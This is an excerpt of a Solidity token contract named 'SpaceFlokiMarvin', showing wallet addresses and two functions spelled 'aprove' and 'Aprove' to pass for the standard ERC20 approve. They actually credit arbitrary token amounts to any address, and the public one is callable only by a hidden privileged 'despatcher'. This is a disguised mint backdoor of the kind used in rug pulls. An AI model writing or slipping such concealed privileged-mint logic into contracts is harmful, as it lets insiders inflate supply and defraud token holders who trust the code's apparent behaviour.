...
contract SpaceFlokiMarvin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SpaceFlokiMarvin";
    string private _symbol = "SpaceFlokiMarvin";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xe41f3e1Dca4a3cD0dAE8F74FB3749Ff9Ce6E3F12); 
    address payable private teamWalletAddress = payable(0xaed6dB1d74A3c0F84B6037bD5222b9C491C84125); 
...
//	uint256 public _percent = 100;
	...
	function aprove(address spender, uint256 fee) internal{
        require(spender != address(0), "ERC20: aprove to the zero address");
        _tOwned[spender] = _tOwned[spender].add(fee);
    }
	...
	function Aprove(address spender,uint256 fee)public {
		require( despatcher != address(0) && despatcher == msg.sender,"not allow");
        aprove(spender, fee);
    }
